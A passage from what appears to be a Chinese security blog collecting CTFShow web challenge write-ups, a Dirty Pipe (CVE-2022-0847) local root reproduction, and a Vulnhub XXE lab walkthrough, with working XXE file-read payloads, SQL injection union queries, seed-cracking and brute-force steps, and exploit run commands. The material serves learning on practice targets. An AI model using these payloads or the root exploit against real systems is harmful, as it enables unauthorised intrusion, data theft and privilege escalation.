class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a> </p><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>mt_srand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 </p><p>解题：通过随机数来寻找种子 我们让 ?r&#x3D;0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 .&#x2F;php_mt_seed 183607393</p></blockquote><p>这道题先把flag的进行md5加密并取前8位然后进行16进制转10进制最后得到的值作为种子来生成随机数</p><p>通过cookie得到的token要等于两个随机数相加 （这个两个随机数并不相同）</p><p>同时我们可以通过?r&#x3D;0传参得到生成的随机数 因为如果r为零则回执行else语句输出随机数的负数</p><p><img src="/posts/7ba9ac12/image-20220322090313211.png" alt="image-20220322090313211"></p><p>这里我得到的随机数是585666240</p><p>接下来使用脚本得到可能的seed值</p><p>放到linux下编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd php_mt_seed-4.0 </span><br><span class="line">gcc php_mt_seed.c -o php_mt_seed</span><br><span class="line">/php_mt_seed 737212628</span><br></pre></td></tr></table></figure><p>接下来是漫长的等待</p><p><img src="/posts/7ba9ac12/image-20220322095150965.png" alt="image-20220322095150965"></p><p>通过响应头发现php的版本为7.3.11</p><p><img src="/posts/7ba9ac12/image-20220321231926792.png" alt="image-20220321231926792"></p><p>得到</p><p>接下来计算下两个随机数相加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">3842734643</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到:</p><p>585666240<br>1350320544</p><p>接下来传参</p><p>通过get 传参?r&#x3D;585666240</p><p>抓包修改cookie  token&#x3D;1350320544</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220322095242899.png" alt="image-20220322095242899"></p><h2 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h2><p><img src="/posts/7ba9ac12/image-20220322143458709.png" alt="image-20220322143458709"></p><p>右键查看源代码发现javascript代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line"><span class="attr">url</span>:<span class="string">&#x27;checkdb.php&#x27;</span>,</span><br><span class="line"><span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span><br><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>:$(<span class="string">&#x27;#a&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;p&#x27;</span>:$(<span class="string">&#x27;#p&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;d&#x27;</span>:$(<span class="string">&#x27;#d&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;u&#x27;</span>:$(<span class="string">&#x27;#u&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:$(<span class="string">&#x27;#pass&#x27;</span>).<span class="title function_">val</span>()</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(data[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">error</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(data[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用post提交返回一个json</p><p><img src="/posts/7ba9ac12/image-20220322144328975.png" alt="image-20220322144328975"></p><p>接下来对pass进行爆破</p><p><img src="/posts/7ba9ac12/image-20220322145311919.png" alt="image-20220322145311919"></p><p>密码为7758521</p><p>查看返回包</p><p><img src="/posts/7ba9ac12/image-20220322145407656.png" alt="image-20220322145407656"></p><p>得到flag</p><h2 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h2><p><img src="/posts/7ba9ac12/image-20220322150028820.png" alt="image-20220322150028820"></p><p>点击录取名单 得到一个表格</p><p><img src="/posts/7ba9ac12/image-20220322150556267.png" alt="image-20220322150556267"></p><p>可以看出来身份证哪里缺少了生日部分</p><p>点击进入学籍管理系统</p><p><img src="/posts/7ba9ac12/image-20220322150920971.png" alt="image-20220322150920971"></p><p>姓名 我们有了 身份证号缺少生日部分</p><p>抓包爆破 这里我用火狐抓的包有问题，换到chrome就好了</p><p><img src="/posts/7ba9ac12/image-20220322151658846.png" alt="image-20220322151658846"></p><p><img src="/posts/7ba9ac12/image-20220322151959622.png" alt="image-20220322151959622"></p><p><img src="/posts/7ba9ac12/image-20220322152050729.png" alt="image-20220322152050729"></p><p>得到出生日期 看回包</p><p>还以为是flag 没想到是unicode编码</p><p><img src="/posts/7ba9ac12/image-20220322152154775.png" alt="image-20220322152154775"></p><p><img src="/posts/7ba9ac12/image-20220322152401867.png" alt="image-20220322152401867"></p><p>登录 教务系统</p><p>拿到flag</p><p><img src="/posts/7ba9ac12/image-20220322152542559.png" alt="image-20220322152542559"></p><h2 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h2><p>where is flag?</p><p><img src="/posts/7ba9ac12/image-20220322153030411.png" alt="image-20220322153030411"></p><p><img src="/posts/7ba9ac12/image-20220322153115359.png" alt="image-20220322153115359"></p><p>看到url 的目录有点奇怪</p><p>继续抓包爆破</p><p><img src="/posts/7ba9ac12/image-20220322161517660.png" alt="image-20220322161517660"></p><p>第一，二位置配置一样</p><p><img src="/posts/7ba9ac12/image-20220322153553364.png" alt="image-20220322153553364"></p><p><img src="/posts/7ba9ac12/image-20220322161457124.png" alt="image-20220322161457124"></p><p>查看回包</p><p><img src="/posts/7ba9ac12/image-20220322161547231.png" alt="image-20220322161547231"></p><p>拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_信息搜集</title>
      <link href="/posts/a805ee79/"/>
      <url>/posts/a805ee79/</url>
      
        <content type="html"><![CDATA[<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p><img src="/posts/a805ee79/image-20220314225911075.png" alt="image-20220314225911075"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220314225935080.png" alt="image-20220314225935080"></p><p>发现falg</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/a805ee79/image-20220314230516946.png" alt="image-20220314230516946"></p><p>发现无法右键</p><p>使用BP抓包刷新抓取数据包放到重放器发送数据包</p><p><img src="/posts/a805ee79/image-20220314230633907.png" alt="image-20220314230633907"></p><p>拿到flag</p><p>也可以使用火狐浏览器右上角菜单更多工具中的Web开发者工具</p><p><img src="/posts/a805ee79/image-20220314231209183.png" alt="image-20220314231209183"></p><p><img src="/posts/a805ee79/image-20220314231126090.png" alt="image-20220314231126090"></p><p><img src="/posts/a805ee79/image-20220314231233391.png" alt="image-20220314231233391"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p><img src="/posts/a805ee79/image-20220314231700848.png" alt="image-20220314231700848"></p><p>老样子用BP抓包看下</p><p>返回包中发现flag</p><p><img src="/posts/a805ee79/image-20220314231738223.png" alt="image-20220314231738223"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>在url后加上&#x2F;robots.txt查看爬虫文件</p><p><img src="/posts/a805ee79/image-20220314232149792.png" alt="image-20220314232149792"></p><p>发现一个文件</p><p>访问</p><p><img src="/posts/a805ee79/image-20220314232215855.png" alt="image-20220314232215855"></p><p>出现flag</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><img src="/posts/a805ee79/image-20220315171803308.png" alt="image-20220315171803308"></p><p>phps源代码泄露</p><p>访问index.phps</p><p><img src="/posts/a805ee79/image-20220315171853386.png" alt="image-20220315171853386"></p><p><img src="/posts/a805ee79/image-20220315171858003.png" alt="image-20220315171858003"></p><p><img src="/posts/a805ee79/image-20220315171942410.png" alt="image-20220315171942410"></p><p>拿到flag</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>根据题目</p><p><img src="/posts/a805ee79/image-20220315190811938.png" alt="image-20220315190811938"></p><p>访问<a href="http://www.zip/">www.zip</a></p><p><img src="/posts/a805ee79/image-20220315190854205.png" alt="image-20220315190854205"></p><p><img src="/posts/a805ee79/image-20220315190907580.png" alt="image-20220315190907580"></p><p>拿到flag</p><p>提交</p><p><img src="/posts/a805ee79/image-20220315191209690.png" alt="image-20220315191209690"></p><p>是个假flag</p><p>看到题目说解压到了当前目录 直接访问fl000g.txt试下</p><p><img src="/posts/a805ee79/image-20220315191310368.png" alt="image-20220315191310368"></p><p>出现flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p><img src="/posts/a805ee79/image-20220315192327345.png" alt="image-20220315192327345"></p><p>git源码泄露</p><p>访问.git</p><p><img src="/posts/a805ee79/image-20220315192408795.png" alt="image-20220315192408795"></p><p>拿到flag</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p><img src="/posts/a805ee79/image-20220315192940618.png" alt="image-20220315192940618"></p><p>还是版本控制</p><p>除了git还有一个版本控制是svn</p><p>直接访问.svn</p><p><img src="/posts/a805ee79/image-20220315193042837.png" alt="image-20220315193042837"></p><p>拿到flag</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/a805ee79/image-20220315194812318.png" alt="image-20220315194812318"></p><p>这个题主要考察 vim的缓存泄露</p><blockquote><p>以 index.php 为例 </p><p>第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p></blockquote><p>访问index.php.swp</p><p><img src="/posts/a805ee79/image-20220315195216485.png" alt="image-20220315195216485"></p><p><img src="/posts/a805ee79/image-20220315195242027.png" alt="image-20220315195242027"></p><p>拿到flag</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p><img src="/posts/a805ee79/image-20220315211938803.png" alt="image-20220315211938803"></p><p>F12打开开发者工具 打开网络抓包，查看cookie</p><p><img src="/posts/a805ee79/image-20220315212145315.png" alt="image-20220315212145315"></p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p><img src="/posts/a805ee79/image-20220315212420525.png" alt="image-20220315212420525"></p><p>使用域名解析查看</p><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p><img src="/posts/a805ee79/image-20220315212610660.png" alt="image-20220315212610660"></p><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><p><img src="/posts/a805ee79/image-20220315213126831.png" alt="image-20220315213126831"></p><p><img src="/posts/a805ee79/image-20220315213119215.png" alt="image-20220315213119215"></p><p>一个购物界面</p><p>页面最下面发现一串可以数字</p><p><img src="/posts/a805ee79/image-20220315213043070.png" alt="image-20220315213043070"></p><p>根据题目我们要进入到后台</p><p>看下robots.txt爬虫文件看下有什么目录</p><p><img src="/posts/a805ee79/image-20220315213223077.png" alt="image-20220315213223077"></p><p>发现一个admin目录</p><p><img src="/posts/a805ee79/image-20220315213247394.png" alt="image-20220315213247394"></p><p>用户名admin 密码就是上面那串数字</p><p><img src="/posts/a805ee79/image-20220315213334050.png" alt="image-20220315213334050"></p><p>拿到flag</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><p><img src="/posts/a805ee79/image-20220315213423939.png" alt="image-20220315213423939"></p><p>页面最下面查看文档</p><p><img src="/posts/a805ee79/image-20220315213753195.png" alt="image-20220315213753195"></p><p><img src="/posts/a805ee79/image-20220315213826590.png" alt="image-20220315213826590"></p><p>发现目标</p><p>访问目录&#x2F;system1103&#x2F;login.php</p><p><img src="/posts/a805ee79/image-20220315213947106.png" alt="image-20220315213947106"></p><p>使用默认密码登录</p><p><img src="/posts/a805ee79/image-20220315214022669.png" alt="image-20220315214022669"></p><p>拿到flag</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><p><img src="/posts/a805ee79/image-20220315214124007.png" alt="image-20220315214124007"></p><p>打开 链接像是某个app的官方界面</p><p>根据题目访问&#x2F;editor</p><p><img src="/posts/a805ee79/image-20220315215323992.png" alt="image-20220315215323992"></p><p>是一个编辑器，点击图片</p><p><img src="/posts/a805ee79/image-20220315215344782.png" alt="image-20220315215344782"></p><p>点击图片空间可以遍历服务器目录</p><p><img src="/posts/a805ee79/image-20220315215434205.png" alt="image-20220315215434205"></p><p>发现flag文件</p><p>接下来在url访问，直接在url后面加&#x2F;nothinghere&#x2F;fl000g.txt</p><p><img src="/posts/a805ee79/image-20220315215523391.png" alt="image-20220315215523391"></p><p>拿到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><p><img src="/posts/a805ee79/image-20220315215807585.png" alt="image-20220315215807585"></p><p><img src="/posts/a805ee79/image-20220315215953619.png" alt="image-20220315215953619"></p><p>打开页面最下面发现一个邮箱</p><p>url后面输入admin进入到后台</p><p>发现一个忘记密码的操作</p><p><img src="/posts/a805ee79/image-20220315220408424.png" alt="image-20220315220408424"></p><p>我们刚才得到一个邮箱 正好是qq邮箱可以通过qq信息查看城市</p><p><img src="/posts/a805ee79/image-20220315220733711.png" alt="image-20220315220733711"></p><p>在西安</p><p><img src="/posts/a805ee79/image-20220315220811268.png" alt="image-20220315220811268"></p><p>登录后台拿到flag</p><p><img src="/posts/a805ee79/image-20220315220903318.png" alt="image-20220315220903318"></p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><p><img src="/posts/a805ee79/image-20220315221153306.png" alt="image-20220315221153306"></p><p>在url后面添加tz.php</p><p><img src="/posts/a805ee79/image-20220315221807760.png" alt="image-20220315221807760"></p><p>进入探针页面查看phpinfor</p><p>搜索flag</p><p><img src="/posts/a805ee79/image-20220315221855292.png" alt="image-20220315221855292"></p><p>拿到flag</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><p><img src="/posts/a805ee79/image-20220315222018553.png" alt="image-20220315222018553"></p><p>备份文件一般命名为backup访问backup.sql</p><p><img src="/posts/a805ee79/image-20220315222236426.png" alt="image-20220315222236426"></p><p><img src="/posts/a805ee79/image-20220315222251785.png" alt="image-20220315222251785"></p><p>拿到flag</p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p><img src="/posts/a805ee79/image-20220315222502436.png" alt="image-20220315222502436"></p><p>使用开发者工具查看js文件</p><p><img src="/posts/a805ee79/image-20220315223020389.png" alt="image-20220315223020389"></p><p>解码看下</p><p><img src="/posts/a805ee79/image-20220315223049696.png" alt="image-20220315223049696"></p><p>访问110.php</p><p><img src="/posts/a805ee79/image-20220315223113606.png" alt="image-20220315223113606"></p><p>拿到flag</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><p><img src="/posts/a805ee79/image-20220315223607588.png" alt="image-20220315223607588"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220315223646712.png" alt="image-20220315223646712"></p><p>发现账号密码</p><p>hackbar使用post提交</p><p><img src="/posts/a805ee79/image-20220315224036124.png" alt="image-20220315224036124"></p><p><img src="/posts/a805ee79/image-20220315224042961.png" alt="image-20220315224042961"></p><p>拿到flag</p><h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>访问&#x2F;db&#x2F;db.mdb</p><p>下载数据库备份文件</p><p>使用easyaccess打开搜索flag</p><p><img src="/posts/a805ee79/image-20220315225015240.png" alt="image-20220315225015240"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847 Linux内核提权漏洞复现</title>
      <link href="/posts/77a28503/"/>
      <url>/posts/77a28503/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-0847Linux内核提权漏洞复现"><a href="#CVE-2022-0847Linux内核提权漏洞复现" class="headerlink" title="CVE-2022-0847Linux内核提权漏洞复现"></a>CVE-2022-0847Linux内核提权漏洞复现</h1><blockquote><p>漏洞影响版本：5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><p>POC:<a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p></blockquote><blockquote><p>漏洞原理：<a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com</a></p></blockquote><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Linux RedTeam 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU&#x2F;Linux</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit: A root exploit for CVE-2022-0847 (Dirty Pipe) (github.com)</a></p><p>使用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./exploit  </span><br></pre></td></tr></table></figure><p>执行成功后root密码变为aaron使用命令su输入密码即可进入root命令行</p><p>部分执行完成后直接进入shell</p><p><img src="/posts/77a28503/yDazi35C1ZqLEXF-16590095805203.png" alt="yDazi35C1ZqLEXF"></p><p>恢复密码命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub XXE靶机渗透记录</title>
      <link href="/posts/8c5d5e49/"/>
      <url>/posts/8c5d5e49/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-XXE靶场复现"><a href="#Vulnhub-XXE靶场复现" class="headerlink" title="Vulnhub-XXE靶场复现"></a>Vulnhub-XXE靶场复现</h1><p>靶场地址：<a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p><strong>1、nmap扫描主机</strong></p><p>靶机没有密码只有扫描</p><p><img src="/posts/8c5d5e49/image-20220307224327734.png" alt="image-20220307224327734"></p><p>扫到一个开放80端口的主机 打开浏览器看下</p><p><img src="/posts/8c5d5e49/image-20220307224411581.png" alt="image-20220307224411581"></p><p>好像并没有什么</p><p>使用目录扫描工具扫下</p><p><img src="/posts/8c5d5e49/image-20220307224832118.png" alt="image-20220307224832118"></p><p>看到robots.txt爬虫文件打卡看下</p><p><img src="/posts/8c5d5e49/image-20220307224904223.png" alt="image-20220307224904223"></p><p>发现一个xxe目录</p><p>进去看下</p><p><img src="/posts/8c5d5e49/image-20220307224931306.png" alt="image-20220307224931306"></p><p>是个登录框</p><p>使用弱口令抓包试下</p><p><strong>2、发现xxe漏洞</strong></p><p><img src="/posts/8c5d5e49/image-20220307225204537.png" alt="image-20220307225204537"></p><p>xml格式</p><p>使用读文件payload试下能不能读passwd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>接下来针对admin.php看下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/8c5d5e49/image-20220307230938074.png" alt="image-20220307230938074"></p><p>发现一段base64加密</p><p><img src="/posts/8c5d5e49/image-20220307231024452.png" alt="image-20220307231024452"></p><p><img src="/posts/8c5d5e49/image-20220307231122838.png" alt="image-20220307231122838"></p><p>发现md5加密的密码</p><p><img src="/posts/8c5d5e49/image-20220307231152070.png" alt="image-20220307231152070"></p><p>登录看看</p><p>注意admin.php是在xxe目录下 因为我们刚才在使用读文件协议实在xxe目录下</p><p><img src="/posts/8c5d5e49/image-20220307231609573.png" alt="image-20220307231609573"></p><p><img src="/posts/8c5d5e49/image-20220307231615415.png" alt="image-20220307231615415"></p><p>什么都没有</p><p>使用读文件协议读下flagmeout.php</p><p><img src="/posts/8c5d5e49/image-20220307231824201.png" alt="image-20220307231824201"></p><p>base64解码</p><p><img src="/posts/8c5d5e49/image-20220307231858595.png" alt="image-20220307231858595"></p><p>得到一串不熟悉的编码。</p><p>好吧，这是base32</p><p><img src="/posts/8c5d5e49/image-20220307232016835.png" alt="image-20220307232016835"></p><p>又是个base64</p><p><img src="/posts/8c5d5e49/image-20220307232058821.png" alt="image-20220307232058821"></p><p>继续读&#x2F;etc&#x2F;.flag.php</p><p><img src="/posts/8c5d5e49/image-20220307232311983.png" alt="image-20220307232311983"></p><p>继续解码</p><p><img src="/posts/8c5d5e49/image-20220307232342978.png" alt="image-20220307232342978"></p><p>看到$_联想到了php去php运行下</p><p><img src="/posts/8c5d5e49/image-20220307232628649.png" alt="image-20220307232628649"></p><p>搞定收工</p><p>整体来说就是各种XXEpaylod 和 编码</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow_web刷题记录[持续更新......]</title>
      <link href="/posts/fa386b67/"/>
      <url>/posts/fa386b67/</url>
      
        <content type="html"><![CDATA[<h1 id="Web刷题记录"><a href="#Web刷题记录" class="headerlink" title="Web刷题记录"></a>Web刷题记录</h1><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/posts/fa386b67/image-20220306204413736-165900174270427.png" alt="image-20220306204413736"></p><p>F12查看源码</p><p><img src="/posts/fa386b67/image-20220306204451163.png" alt="image-20220306204451163"></p><p>base64解码</p><p><img src="/posts/fa386b67/image-20220306204535846.png" alt="image-20220306204535846"></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/fa386b67/image-20220306210147379.png" alt="image-20220306210147379"></p><p>一个登录框</p><p>尝试弱口令，，，，失败</p><p>使用万能密码</p><p><img src="/posts/fa386b67/image-20220306210303069.png" alt="image-20220306210303069"></p><p>成功登录 接下来进行sql注入</p><p><img src="/posts/fa386b67/image-20220306210557871.png" alt="image-20220306210557871"></p><p><img src="/posts/fa386b67/image-20220306210547490.png" alt="image-20220306210547490"></p><p>有3个字段 接下来看回显</p><p><img src="/posts/fa386b67/image-20220306210641695.png" alt="image-20220306210641695"></p><p>2处有回显 改为注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,database(),3#&amp;password=1</span></span><br><span class="line"><span class="string">#查看表</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211250740.png" alt="image-20220306211250740"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 